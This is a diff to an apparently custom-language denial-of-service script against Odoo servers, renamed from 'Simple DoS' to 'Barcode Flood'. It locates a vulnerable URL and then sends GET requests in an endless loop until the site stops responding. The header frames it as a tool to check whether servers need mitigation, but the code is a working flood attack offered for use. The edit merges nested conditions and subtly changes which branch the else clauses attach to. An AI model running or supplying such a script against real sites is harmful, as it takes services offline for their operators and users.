@@ -1,5 +1,5 @@
-// min-v 11.2.0
-// Simple DoS
+// min-v 11.2.1; group none
+// Barcode Flood
 // What is shown here was reported to Odoo (but ignored as it was not considered important).
 // You can use this script to determine if any action is required on your server to mitigate the problem.
 
@@ -15,11 +15,9 @@ for ($i = 20000; $i > 0; $i = $i - 100) {
     }
     print $full_vuln_location
     $resp = (fetch -u $full_vuln_location -o {method: 'GET'} -t 3000)
-    if ($resp) {
-        if ($resp['status'] == 200) {
-            $vuln_location = $full_vuln_location
-            break
-        }
+    if ($resp && $resp['status'] == 200) {
+        $vuln_location = $full_vuln_location
+        break
     } else {
         if ($resp == null) {
             print "Website offline! (Has endured less than expected :S)"
@@ -38,11 +36,9 @@ $count = 1
 for (;1;) {
     print 'Sending request #' + $count + '...'
     $resp = (fetch -u $full_vuln_location -o {method: 'GET'} -t 100)
-    if ($resp) {
-        if ($resp['status'] != 200) {
-            print "Website offline! (Proxied)"
-            break
-        }
+    if ($resp && $resp['status'] != 200) {
+        print "Website offline! (Proxied)"
+        break
     } else {
         if ($resp == null) {
             print "Website offline!"
